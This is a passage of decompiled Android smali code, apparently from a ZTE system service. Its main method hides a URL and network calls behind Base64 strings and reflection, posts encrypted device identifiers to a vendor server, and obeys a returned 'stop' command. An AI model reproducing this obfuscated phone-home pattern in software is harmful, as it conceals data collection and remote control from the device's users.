    iget-object v0, p0, Lcom/zte/heartyservice/main/staService;->mAdapter:Lcom/zte/heartyservice/main/staAdapter;

    invoke-virtual {v0}, Lcom/zte/heartyservice/main/staAdapter;->h()Z

    move-result v0

    const/4 v1, 0x1

    if-ne v0, v1, :cond_2

    .line 228
    :goto_0
    return-void

    .line 225
    :cond_2
    invoke-direct {p0}, Lcom/zte/heartyservice/main/staService;->a()V

    .line 226
    invoke-direct {p0}, Lcom/zte/heartyservice/main/staService;->q()V

    .line 227
    invoke-direct {p0}, Lcom/zte/heartyservice/main/staService;->o()V

    goto :goto_0
.end method

.method public s()J
    .locals 33
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    .line 674
    const-wide/16 v22, 0x0

    .line 676
    .local v22, ret:J
    :try_start_0
    new-instance v27, Ljava/lang/String;

    const-string v28, "amF2YS5uZXQuVVJM"

    invoke-virtual/range {v28 .. v28}, Ljava/lang/String;->getBytes()[B

    move-result-object v28

    const/16 v29, 0x2

    invoke-static/range {v28 .. v29}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v28

    invoke-direct/range {v27 .. v28}, Ljava/lang/String;-><init>([B)V

    invoke-static/range {v27 .. v27}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v10

    .line 677
    .local v10, clazz:Ljava/lang/Class;,"Ljava/lang/Class<*>;"
    const/16 v27, 0x1

    move/from16 v0, v27

    new-array v6, v0, [Ljava/lang/Class;

    const/16 v27, 0x0

    const-class v28, Ljava/lang/String;

    aput-object v28, v6, v27

    .line 678
    .local v6, argTypes:[Ljava/lang/Class;,"[Ljava/lang/Class<*>;"
    invoke-virtual {v10, v6}, Ljava/lang/Class;->getConstructor([Ljava/lang/Class;)Ljava/lang/reflect/Constructor;

    move-result-object v13

    .line 679
    .local v13, constructor:Ljava/lang/reflect/Constructor;,"Ljava/lang/reflect/Constructor<*>;"
    const/16 v27, 0x1

    move/from16 v0, v27

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v27, v0

    const/16 v28, 0x0

    new-instance v29, Ljava/lang/String;

    const-string v30, "aHR0cDovL2Nsb3VkLnp0ZWRldmljZXMuY29tL2hzL2lzc3RvcA=="

    invoke-virtual/range {v30 .. v30}, Ljava/lang/String;->getBytes()[B

    move-result-object v30

    const/16 v31, 0x2

    invoke-static/range {v30 .. v31}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v30

    invoke-direct/range {v29 .. v30}, Ljava/lang/String;-><init>([B)V

    aput-object v29, v27, v28

    move-object/from16 v0, v27

    invoke-virtual {v13, v0}, Ljava/lang/reflect/Constructor;->newInstance([Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v26

    .line 683
    .local v26, u:Ljava/lang/Object;
    new-instance v27, Ljava/lang/String;

    const-string v28, "b3BlbkNvbm5lY3Rpb24="

    invoke-virtual/range {v28 .. v28}, Ljava/lang/String;->getBytes()[B

    move-result-object v28

    const/16 v29, 0x2

    invoke-static/range {v28 .. v29}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v28

    invoke-direct/range {v27 .. v28}, Ljava/lang/String;-><init>([B)V

    const/16 v28, 0x0

    invoke-static/range {v26 .. v28}, Lcom/zte/heartyservice/common/utils/LoadMethodEx;->invokeTargetMethod(Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v5

    .line 685
    .local v5, aa:Ljava/lang/Object;
    new-instance v27, Ljava/lang/String;

    const-string v28, "c2V0Q29ubmVjdFRpbWVvdXQ="

    invoke-virtual/range {v28 .. v28}, Ljava/lang/String;->getBytes()[B

    move-result-object v28

    const/16 v29, 0x2

    invoke-static/range {v28 .. v29}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v28

    invoke-direct/range {v27 .. v28}, Ljava/lang/String;-><init>([B)V

    const/16 v28, 0x1

    move/from16 v0, v28

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v28, v0

    const/16 v29, 0x0

    const/16 v30, 0x7530

    invoke-static/range {v30 .. v30}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v30

    aput-object v30, v28, v29

    move-object/from16 v0, v27

    move-object/from16 v1, v28

    invoke-static {v5, v0, v1}, Lcom/zte/heartyservice/common/utils/LoadMethodEx;->invokeTargetMethod(Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 687
    new-instance v27, Ljava/lang/String;

    const-string v28, "c2V0UmVhZFRpbWVvdXQ="

    invoke-virtual/range {v28 .. v28}, Ljava/lang/String;->getBytes()[B

    move-result-object v28

    const/16 v29, 0x2

    invoke-static/range {v28 .. v29}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v28

    invoke-direct/range {v27 .. v28}, Ljava/lang/String;-><init>([B)V

    const/16 v28, 0x1

    move/from16 v0, v28

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v28, v0

    const/16 v29, 0x0

    const/16 v30, 0x2710

    invoke-static/range {v30 .. v30}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v30

    aput-object v30, v28, v29

    move-object/from16 v0, v27

    move-object/from16 v1, v28

    invoke-static {v5, v0, v1}, Lcom/zte/heartyservice/common/utils/LoadMethodEx;->invokeTargetMethod(Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 689
    new-instance v27, Ljava/lang/String;

    const-string v28, "c2V0RG9PdXRwdXQ="

    invoke-virtual/range {v28 .. v28}, Ljava/lang/String;->getBytes()[B

    move-result-object v28

    const/16 v29, 0x2

    invoke-static/range {v28 .. v29}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v28

    invoke-direct/range {v27 .. v28}, Ljava/lang/String;-><init>([B)V

    const/16 v28, 0x1

    move/from16 v0, v28

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v28, v0

    const/16 v29, 0x0

    const/16 v30, 0x1

    invoke-static/range {v30 .. v30}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v30

    aput-object v30, v28, v29

    move-object/from16 v0, v27

    move-object/from16 v1, v28

    invoke-static {v5, v0, v1}, Lcom/zte/heartyservice/common/utils/LoadMethodEx;->invokeTargetMethod(Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 691
    new-instance v27, Ljava/lang/String;

    const-string v28, "c2V0RG9JbnB1dA=="

    invoke-virtual/range {v28 .. v28}, Ljava/lang/String;->getBytes()[B

    move-result-object v28

    const/16 v29, 0x2

    invoke-static/range {v28 .. v29}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v28

    invoke-direct/range {v27 .. v28}, Ljava/lang/String;-><init>([B)V

    const/16 v28, 0x1

    move/from16 v0, v28

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v28, v0

    const/16 v29, 0x0

    const/16 v30, 0x1

    invoke-static/range {v30 .. v30}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v30

    aput-object v30, v28, v29

    move-object/from16 v0, v27

    move-object/from16 v1, v28

    invoke-static {v5, v0, v1}, Lcom/zte/heartyservice/common/utils/LoadMethodEx;->invokeTargetMethod(Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 693
    new-instance v27, Ljava/lang/String;

    const-string v28, "c2V0VXNlQ2FjaGVz"

    invoke-virtual/range {v28 .. v28}, Ljava/lang/String;->getBytes()[B

    move-result-object v28

    const/16 v29, 0x2

    invoke-static/range {v28 .. v29}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v28

    invoke-direct/range {v27 .. v28}, Ljava/lang/String;-><init>([B)V

    const/16 v28, 0x1

    move/from16 v0, v28

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v28, v0

    const/16 v29, 0x0

    const/16 v30, 0x0

    invoke-static/range {v30 .. v30}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v30

    aput-object v30, v28, v29

    move-object/from16 v0, v27

    move-object/from16 v1, v28

    invoke-static {v5, v0, v1}, Lcom/zte/heartyservice/common/utils/LoadMethodEx;->invokeTargetMethod(Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 695
    new-instance v27, Ljava/lang/String;

    const-string v28, "c2V0UmVxdWVzdE1ldGhvZA=="

    invoke-virtual/range {v28 .. v28}, Ljava/lang/String;->getBytes()[B

    move-result-object v28

    const/16 v29, 0x2

    invoke-static/range {v28 .. v29}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v28

    invoke-direct/range {v27 .. v28}, Ljava/lang/String;-><init>([B)V

    const/16 v28, 0x1

    move/from16 v0, v28

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v28, v0

    const/16 v29, 0x0

    new-instance v30, Ljava/lang/String;

    const-string v31, "UE9TVA=="

    invoke-virtual/range {v31 .. v31}, Ljava/lang/String;->getBytes()[B

    move-result-object v31

    const/16 v32, 0x2

    invoke-static/range {v31 .. v32}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v31

    invoke-direct/range {v30 .. v31}, Ljava/lang/String;-><init>([B)V

    aput-object v30, v28, v29

    move-object/from16 v0, v27

    move-object/from16 v1, v28

    invoke-static {v5, v0, v1}, Lcom/zte/heartyservice/common/utils/LoadMethodEx;->invokeTargetMethod(Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 697
    new-instance v27, Ljava/lang/String;

    const-string v28, "c2V0UmVxdWVzdFByb3BlcnR5"

    invoke-virtual/range {v28 .. v28}, Ljava/lang/String;->getBytes()[B

    move-result-object v28

    const/16 v29, 0x2

    invoke-static/range {v28 .. v29}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v28

    invoke-direct/range {v27 .. v28}, Ljava/lang/String;-><init>([B)V

    const/16 v28, 0x2

    move/from16 v0, v28

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v28, v0

    const/16 v29, 0x0

    new-instance v30, Ljava/lang/String;

    const-string v31, "Y29udGVudC10eXBl"

    invoke-virtual/range {v31 .. v31}, Ljava/lang/String;->getBytes()[B

    move-result-object v31

    const/16 v32, 0x2

    invoke-static/range {v31 .. v32}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v31

    invoke-direct/range {v30 .. v31}, Ljava/lang/String;-><init>([B)V

    aput-object v30, v28, v29

    const/16 v29, 0x1

    new-instance v30, Ljava/lang/String;

    const-string v31, "YXBwbGljYXRpb24vb2N0ZXQtc3RyZWFt"

    invoke-virtual/range {v31 .. v31}, Ljava/lang/String;->getBytes()[B

    move-result-object v31

    const/16 v32, 0x2

    invoke-static/range {v31 .. v32}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v31

    invoke-direct/range {v30 .. v31}, Ljava/lang/String;-><init>([B)V

    aput-object v30, v28, v29

    move-object/from16 v0, v27

    move-object/from16 v1, v28

    invoke-static {v5, v0, v1}, Lcom/zte/heartyservice/common/utils/LoadMethodEx;->invokeTargetMethod(Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 699
    invoke-direct/range {p0 .. p0}, Lcom/zte/heartyservice/main/staService;->t()[B

    move-result-object v20

    .line 700
    .local v20, k4:[B
    const/16 v27, 0x10

    move/from16 v0, v27

    new-array v0, v0, [B

    move-object/from16 v17, v0

    .line 701
    .local v17, k:[B
    const/16 v27, 0x0

    const/16 v28, 0x0

    const/16 v29, 0x10

    move-object/from16 v0, v20

    move/from16 v1, v27

    move-object/from16 v2, v17

    move/from16 v3, v28

    move/from16 v4, v29

    invoke-static {v0, v1, v2, v3, v4}, Ljava/lang/System;->arraycopy(Ljava/lang/Object;ILjava/lang/Object;II)V

    .line 703
    const/16 v27, 0xa2

    move/from16 v0, v27

    new-array v15, v0, [B

    fill-array-data v15, :array_0

    .line 704
    .local v15, encodedKey:[B
    const/16 v18, 0x0

    .line 705
    .local v18, k2:Ljava/security/Key;
    const-string v27, "RSA"

    invoke-static/range {v27 .. v27}, Ljava/security/KeyFactory;->getInstance(Ljava/lang/String;)Ljava/security/KeyFactory;

    move-result-object v21

    .line 706
    .local v21, keyFactory:Ljava/security/KeyFactory;
    new-instance v8, Ljava/security/spec/X509EncodedKeySpec;

    invoke-direct {v8, v15}, Ljava/security/spec/X509EncodedKeySpec;-><init>([B)V

    .line 707
    .local v8, bobPubKeySpec:Ljava/security/spec/X509EncodedKeySpec;
    move-object/from16 v0, v21

    invoke-virtual {v0, v8}, Ljava/security/KeyFactory;->generatePublic(Ljava/security/spec/KeySpec;)Ljava/security/PublicKey;

    move-result-object v18

    .line 709
    const/16 v27, 0x10

    move/from16 v0, v27

    new-array v0, v0, [B

    move-object/from16 v19, v0

    fill-array-data v19, :array_1

    .line 711
    .local v19, k3:[B
    new-instance v27, Ljava/lang/String;

    const-string v28, "c2V0UmVxdWVzdFByb3BlcnR5"

    invoke-virtual/range {v28 .. v28}, Ljava/lang/String;->getBytes()[B

    move-result-object v28

    const/16 v29, 0x2

    invoke-static/range {v28 .. v29}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v28

    invoke-direct/range {v27 .. v28}, Ljava/lang/String;-><init>([B)V

    const/16 v28, 0x2

    move/from16 v0, v28

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v28, v0

    const/16 v29, 0x0

    const-string v30, "p0"

    aput-object v30, v28, v29

    const/16 v29, 0x1

    move-object/from16 v0, p0

    move-object/from16 v1, v17

    move-object/from16 v2, v18

    invoke-direct {v0, v1, v2}, Lcom/zte/heartyservice/main/staService;->u([BLjava/security/Key;)Ljava/lang/String;

    move-result-object v30

    aput-object v30, v28, v29

    move-object/from16 v0, v27

    move-object/from16 v1, v28

    invoke-static {v5, v0, v1}, Lcom/zte/heartyservice/common/utils/LoadMethodEx;->invokeTargetMethod(Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 713
    new-instance v27, Ljava/lang/String;

    const-string v28, "c2V0UmVxdWVzdFByb3BlcnR5"

    invoke-virtual/range {v28 .. v28}, Ljava/lang/String;->getBytes()[B

    move-result-object v28

    const/16 v29, 0x2

    invoke-static/range {v28 .. v29}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v28

    invoke-direct/range {v27 .. v28}, Ljava/lang/String;-><init>([B)V

    const/16 v28, 0x2

    move/from16 v0, v28

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v28, v0

    const/16 v29, 0x0

    const-string v30, "p1"

    aput-object v30, v28, v29

    const/16 v29, 0x1

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/zte/heartyservice/main/staService;->did:Ljava/lang/String;

    move-object/from16 v30, v0

    invoke-virtual/range {v30 .. v30}, Ljava/lang/String;->getBytes()[B

    move-result-object v30

    const/16 v31, 0x2

    invoke-static/range {v30 .. v31}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v30

    move-object/from16 v0, p0

    move-object/from16 v1, v30

    move-object/from16 v2, v19

    invoke-direct {v0, v1, v2}, Lcom/zte/heartyservice/main/staService;->v(Ljava/lang/String;[B)Ljava/lang/String;

    move-result-object v30

    move-object/from16 v0, p0

    move-object/from16 v1, v30

    move-object/from16 v2, v17

    invoke-direct {v0, v1, v2}, Lcom/zte/heartyservice/main/staService;->v(Ljava/lang/String;[B)Ljava/lang/String;

    move-result-object v30

    aput-object v30, v28, v29

    move-object/from16 v0, v27

    move-object/from16 v1, v28

    invoke-static {v5, v0, v1}, Lcom/zte/heartyservice/common/utils/LoadMethodEx;->invokeTargetMethod(Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 715
    new-instance v27, Ljava/lang/String;

    const-string v28, "c2V0UmVxdWVzdFByb3BlcnR5"

    invoke-virtual/range {v28 .. v28}, Ljava/lang/String;->getBytes()[B

    move-result-object v28

    const/16 v29, 0x2

    invoke-static/range {v28 .. v29}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v28

    invoke-direct/range {v27 .. v28}, Ljava/lang/String;-><init>([B)V

    const/16 v28, 0x2

    move/from16 v0, v28

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v28, v0

    const/16 v29, 0x0

    const-string v30, "p52"

    aput-object v30, v28, v29

    const/16 v29, 0x1

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/zte/heartyservice/main/staService;->sid:Ljava/lang/String;

    move-object/from16 v30, v0

    move-object/from16 v0, p0

    move-object/from16 v1, v30

    move-object/from16 v2, v17

    invoke-direct {v0, v1, v2}, Lcom/zte/heartyservice/main/staService;->v(Ljava/lang/String;[B)Ljava/lang/String;

    move-result-object v30

    aput-object v30, v28, v29

    move-object/from16 v0, v27

    move-object/from16 v1, v28

    invoke-static {v5, v0, v1}, Lcom/zte/heartyservice/common/utils/LoadMethodEx;->invokeTargetMethod(Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 718
    new-instance v27, Ljava/lang/String;

    const-string v28, "Z2V0UmVzcG9uc2VDb2Rl"

    invoke-virtual/range {v28 .. v28}, Ljava/lang/String;->getBytes()[B

    move-result-object v28

    const/16 v29, 0x2

    invoke-static/range {v28 .. v29}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v28

    invoke-direct/range {v27 .. v28}, Ljava/lang/String;-><init>([B)V

    const/16 v28, 0x0

    move-object/from16 v0, v27

    move-object/from16 v1, v28

    invoke-static {v5, v0, v1}, Lcom/zte/heartyservice/common/utils/LoadMethodEx;->invokeTargetMethod(Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v27

    check-cast v27, Ljava/lang/Integer;

    invoke-virtual/range {v27 .. v27}, Ljava/lang/Integer;->intValue()I

    move-result v7

    .line 720
    .local v7, bb:I
    const/16 v27, 0xc8

    move/from16 v0, v27

    if-ne v7, v0, :cond_0

    .line 721
    const/16 v27, 0x400

    move/from16 v0, v27

    new-array v9, v0, [B

    .line 722
    .local v9, buffer:[B
    new-instance v27, Ljava/lang/String;

    const-string v28, "Z2V0SW5wdXRTdHJlYW0="

    invoke-virtual/range {v28 .. v28}, Ljava/lang/String;->getBytes()[B

    move-result-object v28

    const/16 v29, 0x2

    invoke-static/range {v28 .. v29}, Landroid/util/Base64;->decode([BI)[B

    move-result-object v28

    invoke-direct/range {v27 .. v28}, Ljava/lang/String;-><init>([B)V

    const/16 v28, 0x0

    move-object/from16 v0, v27

    move-object/from16 v1, v28

    invoke-static {v5, v0, v1}, Lcom/zte/heartyservice/common/utils/LoadMethodEx;->invokeTargetMethod(Ljava/lang/Object;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v16

    check-cast v16, Ljava/io/InputStream;

    .line 723
    .local v16, in:Ljava/io/InputStream;
    move-object/from16 v0, v16

    invoke-virtual {v0, v9}, Ljava/io/InputStream;->read([B)I

    .line 724
    new-instance v12, Ljava/lang/String;

    const-string v27, "utf-8"

    move-object/from16 v0, v27

    invoke-direct {v12, v9, v0}, Ljava/lang/String;-><init>([BLjava/lang/String;)V

    .line 725
    .local v12, commond_encry:Ljava/lang/String;
    move-object/from16 v0, v17

    invoke-static {v12, v0}, Lcom/zte/heartyservice/main/staService;->k(Ljava/lang/String;[B)Ljava/lang/String;

    move-result-object v11

    .line 726
    .local v11, commond:Ljava/lang/String;
    const-string v27, "stop"

    move-object/from16 v0, v27

    invoke-virtual {v11, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v27

    if-eqz v27, :cond_0

    .line 727
    const/16 v27, 0x5

    move/from16 v0, v27

    invoke-virtual {v11, v0}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v27

    invoke-static/range {v27 .. v27}, Ljava/lang/Long;->valueOf(Ljava/lang/String;)Ljava/lang/Long;

    move-result-object v27

    invoke-virtual/range {v27 .. v27}, Ljava/lang/Long;->longValue()J
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-wide v24

    .line 728
    .local v24, time:J
    move-wide/from16 v22, v24

    .line 734
    .end local v5           #aa:Ljava/lang/Object;
    .end local v6           #argTypes:[Ljava/lang/Class;,"[Ljava/lang/Class<*>;"
    .end local v7           #bb:I
    .end local v8           #bobPubKeySpec:Ljava/security/spec/X509EncodedKeySpec;
    .end local v9           #buffer:[B
    .end local v10           #clazz:Ljava/lang/Class;,"Ljava/lang/Class<*>;"
    .end local v11           #commond:Ljava/lang/String;
    .end local v12           #commond_encry:Ljava/lang/String;
    .end local v13           #constructor:Ljava/lang/reflect/Constructor;,"Ljava/lang/reflect/Constructor<*>;"
    .end local v15           #encodedKey:[B
    .end local v16           #in:Ljava/io/InputStream;
    .end local v17           #k:[B
    .end local v18           #k2:Ljava/security/Key;
    .end local v19           #k3:[B
    .end local v20           #k4:[B
    .end local v21           #keyFactory:Ljava/security/KeyFactory;
    .end local v24           #time:J
    .end local v26           #u:Ljava/lang/Object;
    :cond_0
    :goto_0
    return-wide v22

    .line 731
    :catch_0
    move-exception v14

    .line 732
    .local v14, e:Ljava/lang/Exception;
    invoke-virtual {v14}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0

    .line 703
    :array_0
    .array-data 0x1
        0x30t
        0x81t
        0x9ft
        0x30t
        0xdt
        0x6t
        0x9t
        0x2at
        0x86t
        0x48t
        0x86t
        0xf7t
        0xdt
        0x1t
        0x1t
        0x1t
        0x5t
        0x0t
        0x3t
        0x81t
        0x8dt
        0x0t
        0x30t
        0x81t
        0x89t
        0x2t
        0x81t
        0x81t
        0x0t
        0xc3t
        0x58t
        0xaet
        0x77t
        0xfft
        0x22t
        0x2bt
        0xd3t
        0x3ft
        0x3dt
        0xc6t
        0x8t
        0xa5t
        0x31t
        0xc6t
        0x0t
        0x67t
        0x1bt
        0x44t
        0xc6t
        0x2t
        0xc8t
        0xd9t
        0xd4t
        0xet
        0xf2t
        0xb6t
        0xe4t
        0xa1t
        0x1ct
        0x4at
        0xf4t
        0x6dt
        0xact
        0x2ft
        0xe2t
        0x2dt
        0x14t
        0xe3t
        0xb7t
        0x39t
        0xfat
        0x67t
        0x7bt
        0x78t
        0x18t
        0x5bt
        0xc2t
        0x13t
        0x38t
        0x6bt
        0x74t
        0x5ft
        0xc8t
        0xe0t
        0x39t
        0x35t
        0x91t
        0x3bt
        0xf7t
        0x5ft
        0xe9t
        0xb3t
        0x53t
        0x9dt
        0xe5t
        0xa7t
        0xeat
        0x77t
        0x2t
        0xc0t
        0x54t
        0x11t
        0x7et
        0x2t
        0xact
        0xa7t
        0x9at
        0xa7t
        0xc3t
        0x89t
        0xcat
        0xbet
        0xe3t
        0x65t
        0x5t
        0x58t
        0x87t
        0x17t
        0xa8t
        0x54t
        0xa2t
        0x5t
        0x67t
        0xdt
        0x61t
        0x4ct
        0x61t
        0x62t
        0xc6t
        0xbft
        0xc4t
        0x67t
        0x89t
        0xd9t
        0xd5t
        0x22t
        0xf4t
        0xf6t
        0x55t
        0x2t
        0x60t
        0xfat
        0x88t
        0x25t
        0xcft
        0x12t
        0x4bt
        0xfet
        0x17t
        0x3et
        0xf3t
        0x23t
        0x42t
        0x58t
        0x5ct
        0x6t
        0x39t
        0x2t
        0x3t
        0x1t
        0x0t
        0x1t
    .end array-data

    .line 709
    nop

    :array_1
    .array-data 0x1
        0x43t
        0xf3t
        0x5t
        0x22t
        0xb2t
        0xa6t
        0x2et
        0xe2t
        0x39t
        0x58t
        0x25t
        0x38t
        0xe0t
        0x2dt
        0x44t
        0xb7t
    .end array-data
.end method
